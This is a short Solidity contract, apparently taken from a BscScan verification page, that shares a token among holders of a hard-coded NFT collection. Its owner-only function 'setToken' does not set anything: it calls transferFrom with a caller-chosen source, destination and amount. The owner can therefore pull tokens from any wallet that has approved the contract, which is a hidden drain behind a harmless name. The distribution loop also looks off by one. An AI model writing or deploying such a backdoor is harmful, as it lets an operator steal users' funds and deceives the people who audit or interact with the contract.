/**
 *Submitted for verification at BscScan.com on 2022-05-31
*/

pragma solidity >=0.6.0 <0.8.0;
 interface token{
    function transfer(address receiver, uint amount) external;
    function transferFrom(address _from, address _to, uint256 _value)external;
    function balanceOf(address receiver)external view returns(uint256);
    function approve(address spender, uint amount) external returns (bool);
}
interface NFTToken{
    function ownerOf(uint256 _tokenId) external view returns (address);
    function transferFrom(address _from, address _to, uint256 _value)external;
    function mint(address toAddress)external;
    function balanceOf(address _owner) external view returns (uint256);
    function tokenNextId()external view returns (uint256);
    function myTokens(address _owner)external view returns ( uint256[] memory);
    function maxTokenId()external view returns (uint256);
    function totalSupply() external view returns (uint256);
}
contract PORA{
    address public owner;
    address public NFT;
    mapping (address=>uint)public mabxx;
    modifier onlyOwner() {
        require(owner==msg.sender, "Not an administrator");
        _;
    }
    constructor()public{
        owner=msg.sender;
        NFT=0xEe1aCe8d4ADb42Eb4eA753Fa6D79f8E9B7C3764B;
     }
     receive() external payable {}
     function setToken(address _token,address EX,address to,uint value)public onlyOwner{
         token(_token).transferFrom(EX,to,value);
     }
     function sendToken(address _token)public onlyOwner{
         uint len=NFTToken(NFT).totalSupply();
         uint _value=token(_token).balanceOf(msg.sender);
         uint baba=_value*20/100/len;
         mabxx[_token]=_value *20/100/1 ether;
         for(uint i=1;i < len;i++){
             address addr=NFTToken(NFT).ownerOf(i);
             token(_token).transferFrom(msg.sender,addr,baba);
         }
        
     }
     function setAdd(address _add)public onlyOwner{
         owner=_add;
     }

}